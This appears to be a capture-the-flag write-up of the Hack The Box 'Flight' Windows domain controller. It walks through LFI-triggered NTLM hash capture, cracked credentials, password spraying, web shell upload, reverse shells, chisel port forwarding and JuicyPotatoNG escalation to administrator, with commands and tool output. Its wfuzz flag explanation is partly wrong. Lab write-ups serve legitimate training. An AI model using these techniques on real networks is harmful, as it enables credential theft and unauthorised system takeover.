@@ -1,0 +1,160 @@
+so we begin by doing an nmap scan of the network and we see that port 80 is open... 
+
+# Nmap 7.94 scan initiated Fri Jul 14 20:26:04 2023 as: nmap -sC -sV -oA flight 10.10.11.187
+Nmap scan report for 10.10.11.187
+Host is up (0.32s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: g0 Aviation
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-15 00:26:49Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 6h59m59s
+| smb2-time: 
+|   date: 2023-07-15T00:27:23
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 14 20:28:13 2023 -- 1 IP address (1 host up) scanned in 128.96 seconds
+
+
+so before anything else we get to enumerate it first... after adding in the hostname flight.htb together with its ip address to the /etc/hosts directory we begin our enumeration .... we open up the page on the web browser and we enumerate more and each of the parameters that we get but it seems like a dummy page... so we don't continue... we enumerate the directories and we still get nothing from there.... so we continue to enumerate the sub-domains and we get something using the wfuzz command
+
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
+
+    -c: This option tells wfuzz to display the output in color. It enhances the readability of the results by highlighting different parts of the output.
+
+    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt: This parameter specifies the wordlist file to be used for fuzzing. In this case, the file /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt is being used. This file likely contains a list of subdomains that will be tested against the target URL.
+
+    -u "http://flight.htb/": This option specifies the target URL that will be fuzzed. In this case, the URL is http://flight.htb/. The tool will replace the FUZZ keyword in the Host header with the subdomains from the wordlist to test for existence or other potential vulnerabilities.
+
+    -H "Host: FUZZ.flight.htb": This parameter sets the Host header for the HTTP request. The FUZZ keyword will be replaced by each subdomain from the wordlist during the fuzzing process. This allows the tool to test different subdomains by substituting them in the Host header.
+
+    --hl 154: This option sets the maximum content length (in bytes) that the server response can have. If the response length exceeds this value, it will be truncated. In this case, the value is set to 154.
+
+
+    after I get access to the vhost school.flight.htb... I add it to my /etc/hosts file and I  access it via the web browser... on opening it I start messing with it and enumerating more details about the website... in the process I find out that the buttons about us and home are functional and that they redirect to 
+
+    http://school.flight.htb/index.php?view=about.html 
+
+    the view parameter seems to be vulnerable to lfi... and we also see that a protection mechanism against such has been put in place.... since its a windows machine we try to put C:\Windows\System32\drivers\etc\hosts it fails because there is  a protection mechanism put in place to  prevent such attacks... so we can try to change the \ sign  to / sign and when we do so we see that we are able to view the path.... now we try and identify a UNC path... the UNC path is a path called the Universal Naming Convention path... in that path if we are able to access it the machine will have to authenticate to access the share that we specify and the good thing is that we are able to intercept this authentication in order to obtain the hash that we can use to get access to the machine after bruteforcing it... and we get the hash as 
+
+    we intercept it using responder 
+
+    responder -I tun0 -v(verbose)
+
+    svc_apache:S@Ss!K@*t13:flight:803cf5029486402e:DD052869AE6E2212F9D32D50105ACC98:01010000000000000056605624B7D90177C23DC2BC8588030000000002000800480056004500580001001E00570049004E002D0047004F005100480044004E005A0032004C004400390004003400570049004E002D0047004F005100480044004E005A0032004C00440039002E0048005600450058002E004C004F00430041004C000300140048005600450058002E004C004F00430041004C000500140048005600450058002E004C004F00430041004C00070008000056605624B7D90106000400020000000800300030000000000000000000000000300000757FA57BE996EE4539958BA0AE2BE6B1E5CED5415DADAC6AD8C77C4077C48BFE0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000 
+
+    it is linked together with the password as S@Ss!K@*t13
+
+
+    so we continue...
+
+    we check using crackmapexec if we can exploit the winrm service as the user we are and we find out no...  we cannot as the user svc_apache. so we move to check the smb shares we have access to but thats just another rabbit hole... even after listing the files recursively... 
+
+    crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares  
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
+SMB         flight.htb      445    G0               [+] Enumerated shares
+SMB         flight.htb      445    G0               Share           Permissions     Remark
+SMB         flight.htb      445    G0               -----           -----------     ------
+SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
+SMB         flight.htb      445    G0               C$                              Default share
+SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
+SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
+SMB         flight.htb      445    G0               Shared          READ            
+SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
+SMB         flight.htb      445    G0               Users           READ            
+SMB         flight.htb      445    G0               Web             READ            
+
+
+we check every single share using the creds we have but unfortunately... its just a huge rabbit hole... so using the creds we have we try and dump the AD users using impacket-GetADUsers and we even get to see the last time the logged on(their time of activity).... 
+
+we are lucky to get the usernames and using the usernames we can try and perform a password spraying attack using crackmapexec.... since we already have the password of svc_apache and since its the password of an account that uses a service... there are high chances that it might belong also to one of the users in the domain... so we just give it a try... we'll be authenticating in SMB since it seems to be a simple service... so lets go for it .... 
+
+
+ sweet.... crackmapexec detects the user S.Moon as the one who has the same password as the account svc_apache... thats something we usually see often... password reuse
+
+
+ soo lets see what we are capable of accessing now as the user S.Moon with the same creds we have...
+
+  crackmapexec smb flight.htb -u users  -p 'S@Ss!K@*t13'     
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
+SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13
+
+alright now lets begin by checking the access we got from smb 
+
+
+crackmapexec smb flight.htb -u S.Moon  -p 'S@Ss!K@*t13' --shares
+SMB         flight.htb      445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
+SMB         flight.htb      445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
+SMB         flight.htb      445    G0               [+] Enumerated shares
+SMB         flight.htb      445    G0               Share           Permissions     Remark
+SMB         flight.htb      445    G0               -----           -----------     ------
+SMB         flight.htb      445    G0               ADMIN$                          Remote Admin
+SMB         flight.htb      445    G0               C$                              Default share
+SMB         flight.htb      445    G0               IPC$            READ            Remote IPC
+SMB         flight.htb      445    G0               NETLOGON        READ            Logon server share 
+SMB         flight.htb      445    G0               Shared          READ,WRITE      
+SMB         flight.htb      445    G0               SYSVOL          READ            Logon server share 
+SMB         flight.htb      445    G0               Users           READ            
+SMB         flight.htb      445    G0               Web             READ       
+
+
+thats the access we have  and seems to me once more this might be a rabbit hole since we are only able to access the Shared share and we also have write privileges over there... and it has nothing on but its actually not a rabbit hole... so because of that we decide to do more research and we find out that
+
+there is a way we can upload a innocent looking file and once a user clicks it....  we get  an ntlm hash belonging to the user... this is through forced authentication as our ip address will be inside the file that the user executed.... 
+
+
+so we get the hash as 
+
+c.bum:Tikkycoll_431012284:flight.htb:9febbcacca83ad7f:9FB33ED99C7FF50E2EF2584382251F9F:0101000000000000808C04666EB7D90112A233C79E050F3300000000020008004A0044003900410001001E00570049004E002D005A003100350033005100380042005400430054004D0004003400570049004E002D005A003100350033005100380042005400430054004D002E004A004400390041002E004C004F00430041004C00030014004A004400390041002E004C004F00430041004C00050014004A004400390041002E004C004F00430041004C0007000800808C04666EB7D90106000400020000000800300030000000000000000000000000300000757FA57BE996EE4539958BA0AE2BE6B1E5CED5415DADAC6AD8C77C4077C48BFE0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
+
+
+
+now checking using cme we see that we do not have winrm access but share access through smb... when we check with  cme our smb privs we see that our we have read and write privileges on the web share... where we find out that it is possible to upload a web shell called pownyshell... after doing the upload we go to WINDOWS/TEMP directory and using a base64 encoded payload we execute it together with netcat to obtain  a powershell reverse shell.... 
+
+The shell that we obtain is the shell of the user svc_apache and as this user... we still feel like we have low privileges considering the fact that we had the creds of  a more powerful user called C.Bum so we go on to leverage this..(The credentials we got) and use a tool called runasCs.exe this tool will allow me to run commands as C.Bum even though I have the low privileges of the user that I have... so we decide to open a reverse shell ... I open a listener on my machine and using runasCs we connect onto our machine and we have a session... using the session we have we enumerate using netstat -ano and we see that there are lots of services that are running... just the normal life of a typical domain controller... but wait! we see that port 8000 is open... this sounds like  a leverage... so using chisel I go on to link  the port back to my local machine where by:
+
+1st command happens on my machine and I specify the port that i'll use for connection... the port should be open
+
+2nd command goes to my victim machine whereby i begin by stipulating the address that my machine wants the other machine to connect through and the port that id want to access the one with the R:127.0.0.1:R.... don't change the 127.0.0.1 to localhost just use it as the way the digits are... 
+
+
+
+alright so we are able to obtain the connection and when we open the page 127.0.0.1:8000 we  see the page that was hidden from us and being hosted... we use go buster but nothing interesting pops up... so we try to enumerate using errors... you can also try and check the headers... but through errors we see that it calls itself out for being an IIS and so we know that it is possible for us to upload an aspx web shell... now using the same payload we used...(The base64 encoded Powershell Payload) we get a reverse shell as iis apppool\defaultapppool soo 
+after checking whoami /privs we see that we have SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+so with the privilege we have it is possible to exploit this using juicypotatong... and so we go for it and using it we execute netcat that connects back to our pc... as administrator... we make sure to give all users privileges to the jp.exe file and the nc.exe file... we note  that when we change the names of these files it fails to work so please note... its not gonna work of you change the name fully...and it might bring issues... Happy Hacking MiaSanMia=we are what we are!!!!
